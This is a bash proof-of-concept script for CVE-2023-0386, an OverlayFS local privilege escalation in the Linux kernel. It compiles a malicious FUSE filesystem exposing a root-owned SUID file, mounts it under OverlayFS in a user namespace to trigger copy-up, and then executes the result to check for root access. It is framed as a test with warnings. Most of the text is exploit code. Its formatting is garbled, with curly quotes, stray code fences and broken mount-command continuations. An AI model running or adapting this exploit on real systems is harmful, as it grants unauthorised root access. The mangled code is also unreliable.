#!/bin/bash

# cve-2023-0386-poc.sh

# CVE-2023-0386 Proof of Concept Test Script

# OverlayFS Local Privilege Escalation Vulnerability

# 

# WARNING: This script is for security testing purposes only

# DO NOT RUN ON PRODUCTION SYSTEMS

# 

# Author: Baptiste CHEVASSUT

# Date: $(date)

# CVE: CVE-2023-0386

set -e

RED=’\033[0;31m’
GREEN=’\033[0;32m’
YELLOW=’\033[1;33m’
BLUE=’\033[0;34m’
NC=’\033[0m’ # No Color

banner() {
echo -e “${BLUE}”
echo “================================================================”
echo “         CVE-2023-0386 OverlayFS Vulnerability Test”
echo “================================================================”
echo -e “${NC}”
}

log_info() {
echo -e “${BLUE}[INFO]${NC} $1”
}

log_success() {
echo -e “${GREEN}[SUCCESS]${NC} $1”
}

log_warning() {
echo -e “${YELLOW}[WARNING]${NC} $1”
}

log_error() {
echo -e “${RED}[ERROR]${NC} $1”
}

log_critical() {
echo -e “${RED}[CRITICAL]${NC} $1”
}

check_prerequisites() {
log_info “Checking prerequisites…”

```
# Check if running as non-root
if [[ $EUID -eq 0 ]]; then
    log_error "This script should NOT be run as root for testing purposes"
    exit 1
fi

# Check kernel version
KERNEL_VERSION=$(uname -r)
log_info "Kernel version: $KERNEL_VERSION"

# Check if FUSE is available
if ! command -v fusermount &> /dev/null && ! command -v fusermount3 &> /dev/null; then
    log_warning "FUSE is not installed. Installing..."
    sudo apt-get update && sudo apt-get install -y fuse libfuse-dev
fi

# Check for required packages
for pkg in gcc pkg-config; do
    if ! command -v $pkg &> /dev/null; then
        log_warning "$pkg not found. Installing..."
        sudo apt-get install -y $pkg
    fi
done

log_success "Prerequisites check completed"
```

}

create_fuse_exploit() {
log_info “Creating malicious FUSE filesystem…”

```
cat > fuse_exploit.c << 'EOF'
```

#define FUSE_USE_VERSION 30
#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <assert.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>

static const char *payload_content = “#!/bin/bash\necho ‘[EXPLOIT] Privilege escalation successful!’\necho ‘[EXPLOIT] Current UID:’ $(id -u)\necho ‘[EXPLOIT] Current GID:’ $(id -g)\nif [ $(id -u) -eq 0 ]; then\n    echo ‘[CRITICAL] ROOT ACCESS GAINED - SYSTEM IS VULNERABLE!’\n    id\nelse\n    echo ‘[INFO] Privilege escalation failed - system may be patched’\nfi\n”;
static const char *target_path = “/exploit”;

static int exploit_getattr(const char *path, struct stat *stbuf, struct fuse_file_info *fi) {
(void) fi;
int res = 0;

```
memset(stbuf, 0, sizeof(struct stat));
if (strcmp(path, "/") == 0) {
    stbuf->st_mode = S_IFDIR | 0755;
    stbuf->st_nlink = 2;
} else if (strcmp(path, target_path) == 0) {
    stbuf->st_mode = S_IFREG | 04755; // SUID bit set
    stbuf->st_nlink = 1;
    stbuf->st_size = strlen(payload_content);
    stbuf->st_uid = 0;  // root ownership
    stbuf->st_gid = 0;  // root group
} else {
    res = -ENOENT;
}

return res;
```

}

static int exploit_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
off_t offset, struct fuse_file_info *fi,
enum fuse_readdir_flags flags) {
(void) offset;
(void) fi;
(void) flags;

```
if (strcmp(path, "/") != 0)
    return -ENOENT;

filler(buf, ".", NULL, 0, 0);
filler(buf, "..", NULL, 0, 0);
filler(buf, target_path + 1, NULL, 0, 0);

return 0;
```

}

static int exploit_open(const char *path, struct fuse_file_info *fi) {
if (strcmp(path, target_path) != 0)
return -ENOENT;

```
return 0;
```

}

static int exploit_read(const char *path, char *buf, size_t size, off_t offset,
struct fuse_file_info *fi) {
size_t len;
(void) fi;

```
if(strcmp(path, target_path) != 0)
    return -ENOENT;

len = strlen(payload_content);
if (offset < len) {
    if (offset + size > len)
        size = len - offset;
    memcpy(buf, payload_content + offset, size);
} else {
    size = 0;
}

return size;
```

}

static const struct fuse_operations exploit_operations = {
.getattr	= exploit_getattr,
.readdir	= exploit_readdir,
.open		= exploit_open,
.read		= exploit_read,
};

int main(int argc, char *argv[]) {
return fuse_main(argc, argv, &exploit_operations, NULL);
}
EOF

```
log_info "Compiling FUSE exploit..."
gcc -Wall fuse_exploit.c $(pkg-config fuse3 --cflags --libs) -o fuse_exploit 2>/dev/null || \
gcc -Wall fuse_exploit.c $(pkg-config fuse --cflags --libs) -o fuse_exploit

log_success "FUSE exploit created successfully"
```

}

run_exploit() {
log_info “Starting CVE-2023-0386 exploitation test…”

```
# Create test directories
mkdir -p fuse_mount upper work overlay

# Start FUSE filesystem
log_info "Mounting malicious FUSE filesystem..."
./fuse_exploit fuse_mount &
FUSE_PID=$!
sleep 2

# Verify FUSE mount
if ! ls fuse_mount/exploit &>/dev/null; then
    log_error "FUSE mount failed"
    kill $FUSE_PID 2>/dev/null || true
    return 1
fi

log_info "FUSE mounted successfully. PID: $FUSE_PID"

# Create user namespace and mount overlay
log_info "Creating user namespace and OverlayFS mount..."

unshare --user --map-root-user --mount bash << 'INNER_SCRIPT'
```

set -e

echo “[INFO] Inside user namespace (UID: $(id -u), GID: $(id -g))”
echo “[INFO] Mounting OverlayFS…”

# Mount OverlayFS

mount -t overlay overlay   
-o lowerdir=fuse_mount,upperdir=upper,workdir=work   
overlay/

echo “[INFO] OverlayFS mounted successfully”
echo “[INFO] Triggering copy-up operation…”

# Trigger copy-up by touching the file

touch overlay/exploit

echo “[INFO] Copy-up triggered. Checking file attributes…”
ls -la overlay/exploit 2>/dev/null || echo “[WARNING] File not found in overlay”
ls -la upper/exploit 2>/dev/null || echo “[WARNING] File not found in upper directory”

INNER_SCRIPT

```
local exploit_result=1

log_info "Returning to main namespace..."
log_info "Testing privilege escalation..."

# Test if the file was copied with SUID bit preserved
if [[ -f upper/exploit ]]; then
    log_info "Exploit file found in upper directory"
    log_info "File permissions: $(ls -la upper/exploit)"
    
    # Check if file has SUID bit
    if [[ -u upper/exploit ]]; then
        log_warning "SUID bit detected on copied file!"
        log_info "Attempting to execute exploit..."
        
        if chmod +x upper/exploit && upper/exploit; then
            log_critical "PRIVILEGE ESCALATION SUCCESSFUL!"
            log_critical "SYSTEM IS VULNERABLE TO CVE-2023-0386!"
            exploit_result=0
        else
            log_info "Execution failed - system may be patched"
        fi
    else
        log_success "SUID bit not preserved - system appears patched"
    fi
else
    log_success "No file copied to upper directory - system appears patched"
fi

# Cleanup
log_info "Cleaning up..."
fusermount -u fuse_mount 2>/dev/null || fusermount3 -u fuse_mount 2>/dev/null || true
kill $FUSE_PID 2>/dev/null || true

return $exploit_result
```

}

cleanup() {
log_info “Performing final cleanup…”
cd /tmp
rm -rf “$TEST_DIR” 2>/dev/null || true
}

main() {
banner

```
# Warning prompt
log_warning "This script tests for CVE-2023-0386 vulnerability"
log_warning "Only run this on test systems - NEVER on production!"
echo -n "Press Enter to continue or Ctrl+C to abort: "
read

# Setup test environment
TEST_DIR="/tmp/cve-2023-0386-test-$(date +%s)"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

# Run tests
check_prerequisites
create_fuse_exploit

echo ""
log_info "=========================================="
log_info "Starting exploitation attempt..."
log_info "=========================================="

if run_exploit; then
    echo ""
    log_critical "=========================================="
    log_critical "VULNERABILITY CONFIRMED!"
    log_critical "Your system is VULNERABLE to CVE-2023-0386"
    log_critical "Immediate kernel update required!"
    log_critical "=========================================="
    RESULT=1
else
    echo ""
    log_success "=========================================="
    log_success "SYSTEM APPEARS SECURE"
    log_success "No vulnerability detected"
    log_success "Your system seems patched against CVE-2023-0386"
    log_success "=========================================="
    RESULT=0
fi

cleanup

echo ""
log_info "Test completed. Check the results above."
echo ""

exit $RESULT
```

}

# Trap to ensure cleanup on exit

trap cleanup EXIT

main “$@”